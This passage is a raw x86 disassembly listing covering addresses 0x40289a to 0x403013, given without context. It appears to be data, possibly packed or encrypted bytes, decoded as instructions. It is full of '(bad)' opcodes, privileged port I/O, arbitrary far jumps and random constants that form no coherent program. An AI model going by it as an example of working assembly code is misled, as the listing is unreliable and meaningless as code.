  40289a:	stc    
  40289b:	(bad)  
  40289d:	cmp    ch,BYTE PTR [ebp+0x35]
  4028a0:	or     BYTE PTR [edx-0x43],ch
  4028a3:	cwde   
  4028a4:	pop    eax
  4028a5:	mov    edx,0xf358d2d4
  4028aa:	fwait
  4028ab:	push   0x76
  4028ad:	stos   DWORD PTR es:[edi],eax
  4028ae:	mov    ebp,0x9cfd8788
  4028b3:	push   edx
  4028b4:	lods   al,BYTE PTR ds:[esi]
  4028b5:	cwde   
  4028b6:	or     BYTE PTR [ecx+ebp*2+0x5a4a2f2a],ch
  4028bd:	imul   edi
  4028bf:	jno    0x4028df
  4028c1:	test   DWORD PTR [ecx+0xa],ebx
  4028c4:	sub    eax,0xb147b373
  4028c9:	push   ds
  4028ca:	or     al,bh
  4028cc:	mov    ebp,0x34e8b98c
  4028d1:	and    DWORD PTR [esi+0x6b95162e],eax
  4028d7:	rol    BYTE PTR [ebx+0x3bf2e2f9],0x2a
  4028de:	lahf   
  4028df:	pop    eax
  4028e0:	mov    ch,0x2
  4028e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028e3:	jmp    DWORD PTR [ebx]
  4028e5:	sbb    dh,BYTE PTR [edx+0x7bdaa11a]
  4028eb:	sbb    edx,esp
  4028ed:	mov    ah,0xeb
  4028ef:	pop    esi
  4028f0:	icebp  
  4028f1:	push   ebp
  4028f2:	sbb    bh,BYTE PTR [edi]
  4028f4:	imul   eax,DWORD PTR [ebp+edx*8+0xcf4d700],0xfffffff3
  4028fc:	sub    al,0x49
  4028fe:	xor    bl,BYTE PTR [ecx+0x7e586d64]
  402904:	dec    ebx
  402905:	dec    ebx
  402906:	xor    DWORD PTR [ecx+0x60c01bad],ebp
  40290c:	adc    DWORD PTR [edi+eiz*8-0x3bcdf04c],edx
  402913:	in     al,0x30
  402915:	inc    BYTE PTR [ecx+0x2e7fcafc]
  40291b:	mov    edi,eax
  40291d:	add    ecx,ebp
  40291f:	mov    eax,ds:0x31f14cb9
  402924:	clc    
  402925:	rol    DWORD PTR [ebx+0x718f30b6],cl
  40292b:	retf   
  40292c:	jg     0x40292b
  40292e:	scas   al,BYTE PTR es:[edi]
  40292f:	and    bh,0x45
  402932:	inc    edx
  402933:	sub    eax,0x8e91e7ba
  402938:	iret   
  402939:	ins    DWORD PTR es:[edi],dx
  40293a:	jmp    0x4028e5
  40293c:	es sahf 
  40293e:	mov    ch,0xb1
  402940:	mov    ebx,es
  402942:	sub    bh,BYTE PTR [ebp-0x6]
  402945:	and    BYTE PTR [edi-0x49d6e736],dl
  40294b:	stos   BYTE PTR es:[edi],al
  40294c:	retf   0x4967
  40294f:	inc    edi
  402950:	mov    esp,0x89f64cf3
  402955:	pop    ecx
  402956:	mov    WORD PTR [ecx],?
  402958:	mov    al,ds:0x79cd78d0
  40295d:	(bad)  
  40295f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402960:	rcr    DWORD PTR [ebx-0x22bfe4b7],cl
  402966:	fstp   QWORD PTR [edi+0x3b]
  402969:	stc    
  40296a:	test   al,0x16
  40296c:	cmp    BYTE PTR [edi-0x4ba348f8],ch
  402972:	pop    ss
  402973:	adc    BYTE PTR [edx-0x74425c90],dl
  402979:	pusha  
  40297a:	in     eax,0xae
  40297c:	sub    ecx,esi
  40297e:	into   
  40297f:	mov    eax,ds:0x3699edbc
  402984:	retf   
  402985:	daa    
  402986:	and    BYTE PTR [bx-0x54],0xdb
  40298b:	fdiv   st(1),st
  40298d:	into   
  40298e:	or     ebp,eax
  402990:	ja     0x402981
  402992:	add    ah,bl
  402994:	and    BYTE PTR ds:0x32af4fa6,0x8e
  40299b:	mov    al,0x37
  40299d:	xchg   BYTE PTR [edx+0x4],cl
  4029a0:	scas   eax,DWORD PTR es:[edi]
  4029a1:	pop    esp
  4029a2:	fimul  WORD PTR [ecx+ebx*2-0x465284f0]
  4029a9:	add    esi,DWORD PTR [ebx]
  4029ab:	xlat   BYTE PTR ds:[ebx]
  4029ac:	jae    0x40299f
  4029ae:	xchg   ebx,eax
  4029af:	xchg   esi,eax
  4029b0:	lock in eax,0xe2
  4029b3:	aam    0x6d
  4029b5:	stos   BYTE PTR es:[edi],al
  4029b6:	sbb    ecx,DWORD PTR [ebx+0x57e8335e]
  4029bc:	lahf   
  4029bd:	add    bl,BYTE PTR [esi]
  4029bf:	stos   DWORD PTR es:[edi],eax
  4029c0:	jo     0x402968
  4029c2:	lods   eax,DWORD PTR ds:[esi]
  4029c3:	ins    BYTE PTR es:[edi],dx
  4029c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029c5:	and    BYTE PTR [ecx-0x53bb69d0],0xa3
  4029cc:	retf   0x75ee
  4029cf:	pop    esi
  4029d0:	loop   0x402967
  4029d2:	test   BYTE PTR [eax-0x3c],cl
  4029d5:	enter  0xfa3d,0x96
  4029d9:	je     0x402964
  4029db:	scas   eax,DWORD PTR es:[edi]
  4029dc:	(bad)  
  4029dd:	int    0x93
  4029df:	out    dx,eax
  4029e0:	sbb    ch,BYTE PTR fs:[eax-0x73]
  4029e4:	xchg   edi,eax
  4029e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029e6:	sar    DWORD PTR [ecx],0x29
  4029e9:	dec    eax
  4029ea:	mov    cl,0x8b
  4029ec:	dec    edx
  4029ed:	ja     0x4029c2
  4029ef:	inc    eax
  4029f0:	stos   DWORD PTR es:[edi],eax
  4029f1:	push   ss
  4029f2:	inc    eax
  4029f3:	mov    WORD PTR [esp+ebp*1+0x36385cf9],fs
  4029fa:	xchg   edi,eax
  4029fb:	adc    DWORD PTR [edx+0x52],esp
  4029fe:	cmp    BYTE PTR [edi],0x8f
  402a01:	nop
  402a02:	lock clc 
  402a04:	outs   dx,BYTE PTR ds:[esi]
  402a05:	hlt    
  402a06:	push   0xfbbc95d9
  402a0b:	outs   dx,BYTE PTR ds:[esi]
  402a0c:	cmp    al,0xdc
  402a0e:	int    0xba
  402a10:	sbb    bh,BYTE PTR [ecx+ecx*2+0x32db6ea9]
  402a17:	jbe    0x4029dd
  402a19:	inc    BYTE PTR [esi+ebx*1+0x43]
  402a1d:	mov    bl,0xdb
  402a1f:	sbb    bl,BYTE PTR [eax+0x3b7812ea]
  402a25:	push   0x4723325c
  402a2a:	inc    eax
  402a2b:	inc    eax
  402a2c:	push   cs
  402a2d:	mov    esi,0x6570169d
  402a32:	loope  0x4029d5
  402a34:	imul   esp,DWORD PTR [eax-0x56],0x77
  402a38:	das    
  402a39:	xchg   ebx,eax
  402a3a:	dec    ecx
  402a3b:	jae    0x402a60
  402a3d:	sbb    eax,0x2dce7fa2
  402a42:	jmp    0x402a4a
  402a44:	inc    esp
  402a45:	xchg   ebp,eax
  402a46:	push   ss
  402a47:	dec    eax
  402a48:	sbb    esp,DWORD PTR [ecx-0x48]
  402a4b:	dec    esp
  402a4c:	push   eax
  402a4d:	pop    esi
  402a4e:	repz mov bh,0xd6
  402a51:	lods   al,BYTE PTR ds:[esi]
  402a52:	xchg   esp,eax
  402a53:	in     eax,dx
  402a54:	ror    edx,0xb4
  402a57:	and    eax,0x65e55609
  402a5c:	stos   BYTE PTR es:[edi],al
  402a5d:	cdq    
  402a5e:	cwde   
  402a5f:	mov    ecx,0x441f1cc4
  402a64:	mov    bl,BYTE PTR [ecx]
  402a66:	adc    bh,BYTE PTR [esi-0x549f5e2d]
  402a6c:	push   esi
  402a6d:	std    
  402a6e:	xchg   DWORD PTR [ecx-0x42],esp
  402a71:	imul   edi,DWORD PTR ds:0x1ddb0b70,0x1a
  402a78:	stc    
  402a79:	js     0x402a7c
  402a7b:	(bad)  
  402a7c:	pop    edi
  402a7d:	stos   DWORD PTR es:[edi],eax
  402a7e:	repnz aas 
  402a80:	(bad)  
  402a81:	loope  0x402ae4
  402a83:	leave  
  402a84:	dec    eax
  402a85:	pop    esp
  402a86:	adc    BYTE PTR [ebx],dl
  402a88:	jle    0x402af6
  402a8a:	rcr    DWORD PTR [ebx-0x2f],cl
  402a8d:	mov    dh,0xe5
  402a8f:	xchg   edi,eax
  402a90:	ins    BYTE PTR es:[edi],dx
  402a91:	mov    ah,dh
  402a93:	rcl    BYTE PTR [edx-0x4a],0x38
  402a97:	(bad)  
  402a98:	mov    dl,0x8b
  402a9a:	adc    al,0xc0
  402a9c:	shl    DWORD PTR [ebx],cl
  402a9e:	mov    WORD PTR [eax-0x45],?
  402aa1:	push   0x97971c53
  402aa6:	xchg   esp,eax
  402aa7:	into   
  402aa8:	popa   
  402aa9:	dec    edi
  402aaa:	sub    al,0xb5
  402aac:	xchg   ebp,eax
  402aad:	pop    ebp
  402aae:	hlt    
  402aaf:	sbb    al,0x90
  402ab1:	popf   
  402ab2:	div    DWORD PTR gs:[edx+0x18]
  402ab6:	sub    esi,edx
  402ab8:	and    DWORD PTR [eax+edi*2-0x7984cea6],ebx
  402abf:	ror    DWORD PTR [edi-0x41],1
  402ac2:	hlt    
  402ac3:	or     DWORD PTR [edx+0x3ba1317a],ecx
  402ac9:	xchg   ecx,eax
  402acb:	xlat   BYTE PTR ds:[bx]
  402acd:	addr16 cs fs sub ebx,eax
  402ad2:	je     0x402b48
  402ad4:	or     bh,ch
  402ad6:	pop    ebp
  402ad7:	add    BYTE PTR [ecx],bh
  402ad9:	jp     0x402a7b
  402adb:	xchg   esp,eax
  402adc:	cmp    DWORD PTR [edi+0x65],esp
  402adf:	inc    ebx
  402ae0:	dec    edx
  402ae1:	xor    ebp,ecx
  402ae3:	xchg   edx,eax
  402ae4:	jne    0x402b45
  402ae6:	adc    eax,0x4caaf123
  402aeb:	jle    0x402b24
  402aed:	(bad)  [eax+eiz*8]
  402af0:	pop    eax
  402af1:	sub    DWORD PTR [ebp+0x7a70bf78],eax
  402af7:	repz sbb eax,0x40df849f
  402afd:	pop    ecx
  402afe:	pop    ecx
  402aff:	out    dx,eax
  402b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b01:	mov    ds:0xda09c6df,al
  402b06:	(bad)  
  402b07:	jnp    0x402b06
  402b09:	and    DWORD PTR [eax+0x5f],eax
  402b0c:	jno    0x402b5a
  402b0e:	int    0x56
  402b10:	pop    ss
  402b11:	scas   al,BYTE PTR es:[edi]
  402b12:	gs add BYTE PTR cs:[ebp-0x55deee34],bl
  402b1a:	(bad)  
  402b1c:	leave  
  402b1d:	pmuludq mm6,QWORD PTR [ecx]
  402b20:	and    ebp,DWORD PTR [ecx]
  402b22:	test   al,0xad
  402b24:	scas   al,BYTE PTR es:[edi]
  402b25:	dec    ecx
  402b26:	push   ecx
  402b27:	jb     0x402ace
  402b29:	jl     0x402b43
  402b2b:	sub    ebp,DWORD PTR [edi-0x71]
  402b2e:	xlat   BYTE PTR ds:[ebx]
  402b2f:	fwait
  402b30:	fs and eax,0x5221e8e1
  402b36:	add    BYTE PTR [edx-0x25],cl
  402b39:	cmp    eax,0x10f8daab
  402b3e:	mov    dh,0x5b
  402b40:	and    DWORD PTR gs:[eax-0x2c2db417],eax
  402b47:	cwde   
  402b48:	das    
  402b49:	xchg   edx,eax
  402b4a:	push   edi
  402b4b:	jnp    0x402b49
  402b4d:	dec    esi
  402b4e:	not    eax
  402b50:	mov    BYTE PTR [ecx+0x5b4d5650],bh
  402b56:	jmp    0x402b23
  402b58:	std    
  402b59:	scas   eax,DWORD PTR es:[edi]
  402b5a:	mov    dh,0xe8
  402b5c:	fs lahf 
  402b5e:	add    DWORD PTR [ebx-0x49ebc560],eax
  402b64:	pop    edx
  402b65:	adc    BYTE PTR [eax],0x36
  402b68:	je     0x402b35
  402b6a:	fild   WORD PTR [eax+0x5c]
  402b6d:	gs fwait
  402b6f:	int3   
  402b70:	pop    esp
  402b71:	push   ebx
  402b72:	sahf   
  402b73:	xchg   edi,eax
  402b74:	out    0x5c,al
  402b76:	call   0x914d:0x94707dc4
  402b7d:	sbb    cl,bh
  402b7f:	inc    ecx
  402b80:	jno    0x402b25
  402b82:	sub    ebx,DWORD PTR [ecx+0x55]
  402b85:	fstp   DWORD PTR [bx-0x73]
  402b89:	jbe    0x402baa
  402b8b:	sbb    al,0x28
  402b8d:	dec    ebp
  402b8e:	pop    ebx
  402b8f:	popf   
  402b90:	leave  
  402b91:	xchg   ebp,eax
  402b92:	(bad)  
  402b93:	pushf  
  402b94:	popf   
  402b95:	add    ah,BYTE PTR [esi]
  402b97:	aad    0xe9
  402b99:	clc    
  402b9a:	push   edi
  402b9b:	add    al,0x93
  402b9d:	jl     0x402c1c
  402b9f:	stos   BYTE PTR es:[edi],al
  402ba0:	out    0xd7,al
  402ba2:	ret    
  402ba3:	lock adc eax,0xf0cbb292
  402ba9:	sbb    DWORD PTR [ebp-0x7c],ebp
  402bac:	(bad)  
  402bad:	adc    edi,DWORD PTR ds:0x7e95d42b
  402bb3:	mov    es,WORD PTR gs:[eax-0xa]
  402bb7:	xchg   eax,ecx
  402bb9:	out    0x9,al
  402bbb:	retf   
  402bbc:	mov    BYTE PTR [ebx],ah
  402bbe:	(bad)  
  402bbf:	jg     0x402b5f
  402bc1:	jmp    0x402bcb
  402bc3:	aas    
  402bc4:	repz jmp 0x251883c
  402bca:	sub    al,0x36
  402bcc:	lahf   
  402bcd:	(bad)  
  402bce:	sti    
  402bcf:	icebp  
  402bd0:	cmp    al,BYTE PTR [ebx]
  402bd2:	and    DWORD PTR [ecx-0x40d59cd5],eax
  402bd8:	das    
  402bd9:	test   eax,0x60054e36
  402bde:	push   esp
  402bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402be0:	xchg   edx,eax
  402be1:	push   edi
  402be2:	dec    edx
  402be3:	fdiv   st,st(0)
  402be5:	nop
  402be6:	neg    bh
  402be8:	mov    edi,0x2a3735ee
  402bed:	(bad)  ds:0x9cedd7da
  402bf3:	adc    al,0xcf
  402bf5:	xchg   ebp,eax
  402bf6:	mov    edi,0x817047ad
  402bfb:	jmp    0x402c43
  402bfd:	adc    eax,0x8832e5ce
  402c02:	jle    0x402baa
  402c04:	imul   ebp,DWORD PTR [edi+0x3f6f51ce],0xd84c2f26
  402c0e:	or     esp,DWORD PTR [ebx-0xb02ed0a]
  402c14:	xor    ah,bh
  402c16:	mov    eax,0x1131a4b7
  402c1b:	push   esp
  402c1c:	fld    st(4)
  402c1e:	pop    eax
  402c1f:	mov    ah,0xbc
  402c21:	mov    eax,ds:0x6baf1a0a
  402c26:	xor    ah,BYTE PTR [edi]
  402c28:	jae    0x402c7e
  402c2a:	pop    ecx
  402c2b:	adc    eax,0x183cddb7
  402c30:	mov    ?,WORD PTR [ecx-0x7dd3bca2]
  402c36:	mov    edx,0xd075f4a6
  402c3b:	out    0xcc,eax
  402c3d:	in     al,dx
  402c3e:	sub    al,ah
  402c40:	cdq    
  402c41:	das    
  402c42:	fidivr WORD PTR fs:[esp+ecx*4]
  402c46:	pop    edx
  402c47:	jecxz  0x402c36
  402c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c4a:	ins    DWORD PTR es:[edi],dx
  402c4b:	ret    0x9f10
  402c4e:	and    al,0x21
  402c50:	int3   
  402c51:	push   ecx
  402c52:	or     ebx,edi
  402c54:	sub    esp,DWORD PTR [ecx+0x17634f96]
  402c5a:	lahf   
  402c5b:	cmc    
  402c5c:	inc    eax
  402c5d:	jns    0x402cb4
  402c5f:	jmp    0x402cce
  402c61:	push   ecx
  402c62:	inc    eax
  402c64:	dec    DWORD PTR [eax-0x4dce6776]
  402c6a:	into   
  402c6b:	jae    0x402c31
  402c6d:	xor    esp,DWORD PTR [ecx]
  402c6f:	sub    al,0x3a
  402c71:	imul   eax,DWORD PTR gs:[edx-0x51fa0dd5],0xffffffd5
  402c79:	dec    ebx
  402c7a:	xor    ebp,ebp
  402c7c:	mov    eax,0x3f7cf0bf
  402c81:	aam    0xdb
  402c83:	test   al,0xa7
  402c85:	sbb    BYTE PTR [eax+0x7d],bl
  402c88:	push   0x7d
  402c8a:	push   esi
  402c8b:	aad    0x77
  402c8d:	mov    edx,0x9d4dd8db
  402c92:	jge    0x402cfe
  402c94:	mov    al,0xab
  402c96:	ficom  DWORD PTR [esi+0x69]
  402c99:	and    DWORD PTR [ebx],esp
  402c9b:	call   0x2a75dc4b
  402ca0:	mov    DWORD PTR [edx],eax
  402ca2:	or     dl,dl
  402ca4:	dec    ecx
  402ca5:	dec    ecx
  402ca6:	rcl    DWORD PTR [edi+0x6825b0b5],0xb2
  402cad:	ja     0x402c5c
  402caf:	and    al,BYTE PTR [edi+0x2eafecc9]
  402cb5:	test   al,0xaf
  402cb7:	xor    al,0xfe
  402cb9:	sub    eax,0xd4816933
  402cbe:	adc    edx,eax
  402cc0:	aam    0x84
  402cc2:	loop   0x402c81
  402cc4:	inc    edx
  402cc5:	cdq    
  402cc6:	cdq    
  402cc7:	pop    edi
  402cc8:	push   edi
  402cc9:	mov    ebp,0x3190ac03
  402cce:	mov    cl,0xe
  402cd0:	daa    
  402cd1:	and    BYTE PTR [edi+0x23],bh
  402cd4:	sbb    ecx,esp
  402cd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cd7:	jne    0x402c7f
  402cd9:	shl    BYTE PTR [eax-0x54790812],cl
  402cdf:	push   eax
  402ce0:	mov    ecx,0xab21adce
  402ce5:	popa   
  402ce6:	inc    edi
  402ce7:	fwait
  402ce8:	out    dx,eax
  402ce9:	mov    ah,0xbd
  402ceb:	lods   eax,DWORD PTR ds:[esi]
  402cec:	ror    DWORD PTR [esi-0x2a885eb4],cl
  402cf2:	xchg   BYTE PTR ds:0x4a0e68db,cl
  402cf8:	je     0x402ce9
  402cfa:	fmul   DWORD PTR [edx]
  402cfc:	jmp    0x73b7:0x7b894a7
  402d03:	add    eax,0xcb20101f
  402d08:	or     al,0x39
  402d0a:	mov    bh,0xdb
  402d0c:	iret   
  402d0d:	nop
  402d0e:	in     al,dx
  402d0f:	stos   BYTE PTR es:[edi],al
  402d10:	jmp    0x402d1e
  402d12:	enter  0x65ea,0xaf
  402d16:	out    dx,al
  402d17:	retf   0x3a2b
  402d1a:	inc    esp
  402d1b:	push   esi
  402d1c:	add    eax,0x9ab7b6b2
  402d21:	sbb    DWORD PTR [eax],edx
  402d23:	mov    ?,eax
  402d25:	ficom  DWORD PTR [edx]
  402d27:	repz je 0x402d80
  402d2a:	mov    ebp,0x5085585c
  402d2f:	aad    0xfd
  402d31:	(bad)  [ebx]
  402d33:	fst    st(0)
  402d35:	call   0xf910bef7
  402d3a:	mov    al,ds:0x2b158028
  402d3f:	sbb    al,0x32
  402d41:	xor    ebx,DWORD PTR [ebp+0x31d0a1af]
  402d47:	xlat   BYTE PTR ds:[ebx]
  402d48:	mov    dl,0x7e
  402d4a:	mov    ?,edi
  402d4c:	adc    bh,BYTE PTR [esi+0x197ed7f0]
  402d52:	es add eax,esi
  402d55:	push   es
  402d56:	jmp    0x1572:0xdb5ec49a
  402d5d:	push   esp
  402d5e:	sub    bl,dl
  402d60:	in     eax,0x4b
  402d62:	xchg   ebp,eax
  402d63:	fidivr DWORD PTR [edx-0x618d7de7]
  402d69:	das    
  402d6a:	jecxz  0x402d36
  402d6c:	cld    
  402d6d:	mov    ah,BYTE PTR [edi-0x1da2d5c7]
  402d73:	push   ebp
  402d74:	stos   BYTE PTR es:[edi],al
  402d75:	inc    ch
  402d77:	inc    ecx
  402d78:	xchg   edx,eax
  402d79:	stc    
  402d7a:	xchg   BYTE PTR [esi+0x34],ah
  402d7d:	push   es
  402d7e:	push   ecx
  402d7f:	rol    DWORD PTR [esi-0x48],0xe7
  402d83:	ret    0x577c
  402d86:	fidiv  DWORD PTR [ebx+0x3347138a]
  402d8c:	neg    ah
  402d8e:	dec    esi
  402d8f:	xor    eax,0x405ce981
  402d94:	cmp    edx,ebx
  402d96:	iret   
  402d97:	cmp    eax,0x661730ec
  402d9c:	mov    dh,0xc5
  402d9e:	push   es
  402d9f:	pop    ss
  402da0:	test   eax,0xd1b078e
  402da5:	xchg   ebp,eax
  402da6:	pop    esi
  402da7:	xchg   edx,eax
  402da8:	iret   
  402da9:	out    0xbd,eax
  402dab:	call   0xa013:0x1f7d5d
  402db2:	inc    edx
  402db3:	dec    BYTE PTR [edx-0x3b660069]
  402db9:	inc    esi
  402dba:	inc    esp
  402dbb:	lods   al,BYTE PTR ds:[esi]
  402dbc:	rcr    ch,0xdc
  402dbf:	pop    ds
  402dc0:	pop    ebx
  402dc1:	xchg   edx,eax
  402dc2:	es retf 0xf3c4
  402dc6:	cmp    edx,DWORD PTR [ebx+0x67]
  402dc9:	or     al,0xef
  402dcb:	mov    ds:0x33618a0f,al
  402dd0:	fiadd  WORD PTR [ebp-0x2100f7ee]
  402dd6:	pop    ecx
  402dd7:	retf   0xd5d0
  402dda:	sbb    edi,eax
  402ddc:	sahf   
  402ddd:	sub    BYTE PTR [esi],0x96
  402de0:	aad    0x16
  402de2:	call   0x4efe:0x38bc478a
  402de9:	cmp    eax,0x8f23618
  402dee:	mov    ebp,0x7190f0c1
  402df3:	call   0x387dd611
  402df8:	sbb    esi,esi
  402dfa:	mov    ebp,0xa5337f7b
  402dff:	shl    BYTE PTR [ecx-0x43],0xed
  402e03:	sub    ah,BYTE PTR [edi+0x5a]
  402e06:	fwait
  402e07:	push   edx
  402e08:	ins    DWORD PTR es:[edi],dx
  402e09:	mov    esi,0x5eb4a17d
  402e0e:	cmp    bl,bl
  402e10:	int3   
  402e11:	(bad)  
  402e12:	repnz in al,dx
  402e14:	popf   
  402e15:	sub    al,0x30
  402e17:	dec    esi
  402e18:	das    
  402e19:	jnp    0x402e81
  402e1b:	push   eax
  402e1c:	inc    esi
  402e1d:	aad    0x93
  402e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e20:	sub    al,0xb2
  402e22:	or     BYTE PTR ds:0x3c8d5718,al
  402e28:	adc    BYTE PTR [edi+eiz*8],dl
  402e2b:	call   0x2bedc947
  402e30:	inc    edi
  402e31:	mov    WORD PTR [esi+0x6c],ds
  402e34:	push   es
  402e35:	inc    edi
  402e36:	dec    edi
  402e37:	sar    BYTE PTR [ebx],0x93
  402e3a:	pop    DWORD PTR [ecx]
  402e3c:	mov    dh,0x41
  402e3e:	add    bl,dl
  402e40:	mov    BYTE PTR [ebx+0x59],bh
  402e43:	call   0x3c15f8b1
  402e48:	and    al,0x16
  402e4a:	out    dx,al
  402e4b:	or     ebp,DWORD PTR [edx+0x61]
  402e4e:	shr    ecx,1
  402e50:	mov    ebx,DWORD PTR [edx-0x3d1ea798]
  402e56:	sbb    ch,BYTE PTR [edx-0x11]
  402e59:	out    dx,eax
  402e5a:	mov    ecx,0xac6337e4
  402e5f:	popf   
  402e60:	fst    DWORD PTR [edx]
  402e62:	push   esp
  402e63:	pop    esi
  402e64:	into   
  402e65:	xor    eax,DWORD PTR [ecx]
  402e67:	popa   
  402e68:	rcr    BYTE PTR [edx],cl
  402e6a:	dec    edx
  402e6b:	adc    dh,ch
  402e6d:	jnp    0x402ee3
  402e6f:	out    0x5e,al
  402e71:	inc    ebp
  402e72:	push   ss
  402e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e74:	xor    BYTE PTR [esi+eax*8+0x22],ah
  402e78:	xchg   ebp,eax
  402e79:	mov    ch,0xa7
  402e7b:	stc    
  402e7c:	dec    edi
  402e7d:	icebp  
  402e7e:	add    al,0x12
  402e80:	in     eax,0x2a
  402e82:	xor    dh,BYTE PTR [edi]
  402e84:	inc    esi
  402e85:	cmp    al,ah
  402e87:	push   0x47e32808
  402e8c:	cld    
  402e8d:	fidiv  WORD PTR [eax+eiz*1+0x4d]
  402e91:	pushf  
  402e92:	xchg   ebp,eax
  402e93:	stos   DWORD PTR es:[edi],eax
  402e94:	cli    
  402e95:	lock xchg edx,eax
  402e97:	clflush BYTE PTR [ecx]
  402e9a:	mov    ch,0xea
  402e9c:	clc    
  402e9d:	test   al,0xc5
  402e9f:	mov    cs,WORD PTR [ecx]
  402ea1:	cdq    
  402ea2:	sbb    ebp,DWORD PTR [ebx-0x179afee]
  402ea8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  402eaa:	cmp    bh,ch
  402eac:	push   cs
  402ead:	jbe    0x402e72
  402eaf:	pop    ebx
  402eb0:	cld    
  402eb1:	push   ebp
  402eb2:	leave  
  402eb3:	add    ebx,DWORD PTR [ebx+0x47]
  402eb6:	push   ss
  402eb7:	retf   
  402eb8:	popa   
  402eb9:	mov    al,0xa0
  402ebb:	and    bl,BYTE PTR [eax-0x65962ec3]
  402ec1:	add    al,0x43
  402ec3:	daa    
  402ec4:	mov    ebp,0x5e43afc1
  402ec9:	jnp    0x402e54
  402ecb:	rol    BYTE PTR [ecx-0x2661146b],1
  402ed1:	xlat   BYTE PTR ds:[ebx]
  402ed2:	ret    
  402ed3:	fimul  DWORD PTR [esi+0x72]
  402ed6:	mov    esp,0x42c438ca
  402edb:	cli    
  402edc:	sti    
  402edd:	out    0xe4,eax
  402edf:	sbb    esp,DWORD PTR [edi+0x1c]
  402ee2:	jmp    0x35770400
  402ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ee8:	mov    DWORD PTR [edi-0x632df39b],esi
  402eee:	and    al,BYTE PTR [edx-0x4d5701f3]
  402ef4:	sbb    eax,0xa0bc6cee
  402ef9:	std    
  402efa:	pop    esi
  402efb:	jl     0x402e9a
  402efd:	xchg   DWORD PTR [ebx],ebx
  402eff:	and    al,0x95
  402f01:	bound  esp,QWORD PTR [edx-0x49]
  402f04:	push   0x365ae407
  402f09:	in     al,0xc0
  402f0b:	sahf   
  402f0c:	jnp    0x402eaf
  402f0e:	and    eax,0x54a06309
  402f13:	repnz inc edi
  402f15:	jle    0x402f00
  402f17:	jbe    0x402f4e
  402f19:	sbb    ah,BYTE PTR [esi-0x77]
  402f1c:	test   DWORD PTR [edx],esi
  402f1e:	sbb    esi,DWORD PTR [edx+0x4bc25c98]
  402f24:	fld    TBYTE PTR [ebx]
  402f26:	mov    al,ds:0x52b907af
  402f2c:	inc    ebx
  402f2d:	ret    
  402f2e:	jl     0x402f14
  402f30:	pushf  
  402f31:	dec    eax
  402f32:	cmp    bh,BYTE PTR [ebp+0x38]
  402f35:	mov    al,ds:0x48fb4b82
  402f3a:	rcl    BYTE PTR [edi+0x4b83716a],cl
  402f40:	enter  0xa1df,0x84
  402f44:	mov    edx,0xf60605a6
  402f49:	sbb    DWORD PTR [ebp+0x22a114ed],edi
  402f4f:	push   edi
  402f50:	adc    bl,cl
  402f52:	scas   eax,DWORD PTR es:[edi]
  402f53:	enter  0x6216,0x83
  402f57:	jo     0x402f11
  402f59:	push   DWORD PTR [eax-0x79999083]
  402f5f:	sbb    ah,BYTE PTR [ebx]
  402f61:	mov    ebx,0x156c17dc
  402f66:	xchg   edi,eax
  402f67:	jmp    0x6206:0x8b1b00a3
  402f6e:	jnp    0x402ef8
  402f70:	cld    
  402f71:	fmul   QWORD PTR [eax]
  402f73:	popf   
  402f74:	(bad)  
  402f75:	(bad)  
  402f76:	cld    
  402f77:	xchg   ecx,eax
  402f78:	fnstenv [esi+0x39]
  402f7b:	pop    edx
  402f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f7d:	adc    ebp,eax
  402f7f:	push   es
  402f80:	or     BYTE PTR [edi-0x1a9045a0],dh
  402f86:	in     eax,dx
  402f87:	pop    ebp
  402f88:	pusha  
  402f89:	mov    ch,0x70
  402f8b:	xchg   ebp,eax
  402f8c:	sbb    edi,DWORD PTR [eax]
  402f8e:	aaa    
  402f8f:	and    ebx,DWORD PTR [ebx+0x23]
  402f92:	push   ds
  402f93:	sub    BYTE PTR [eax+0x7e],ah
  402f96:	jnp    0x402fae
  402f98:	mov    ebp,0xfbdfd4e9
  402f9d:	repz xlat BYTE PTR ds:[ebx]
  402f9f:	mov    dh,0x43
  402fa1:	jge    0x402f86
  402fa3:	inc    esp
  402fa4:	ja     0x402fb8
  402fa6:	repnz cdq 
  402fa8:	les    esp,FWORD PTR [edi+edi*4-0x3b25ff38]
  402faf:	push   esi
  402fb0:	push   cs
  402fb1:	popf   
  402fb2:	mov    esi,DWORD PTR [ebx-0x23ab44bb]
  402fb8:	in     al,0x44
  402fba:	ds mov ebp,0xc967f438
  402fc0:	in     al,dx
  402fc1:	xor    al,0x39
  402fc3:	cli    
  402fc4:	mov    al,0x20
  402fc6:	stc    
  402fc7:	cmp    al,0xe4
  402fc9:	xor    ah,dl
  402fcb:	stc    
  402fcc:	fild   QWORD PTR [ebp+ebx*4-0x55]
  402fd0:	je     0x403027
  402fd2:	rcr    DWORD PTR [ebp-0xed8b4a9],1
  402fd8:	pop    edi
  402fd9:	enter  0x3135,0x9e
  402fdd:	mov    edi,DWORD PTR [ebp+0x405e90cc]
  402fe3:	repz mov ch,0x7
  402fe6:	aaa    
  402fe7:	mov    ch,0xb6
  402fe9:	jp     0x403018
  402feb:	pop    esi
  402fec:	cli    
  402fed:	adc    DWORD PTR [eax+eax*8],edi
  402ff0:	add    ch,BYTE PTR [edx-0x580cdc4c]
  402ff6:	xchg   ebx,eax
  402ff7:	inc    edi
  402ff8:	aad    0xa8
  402ffa:	cmp    al,0xa6
  402ffc:	push   ecx
  402ffd:	inc    edi
  402ffe:	pop    ecx
  402fff:	inc    edx
  403000:	push   edi
  403001:	pop    ss
  403002:	les    esi,FWORD PTR [ebp+0x34]
  403005:	stc    
  403006:	or     BYTE PTR [ecx-0x2a397574],ah
  40300c:	jb     0x403041
  40300e:	outs   dx,BYTE PTR ds:[esi]
  40300f:	out    dx,eax
  403010:	jbe    0x403002
  403012:	sti    
  403013:	add    al,0x35
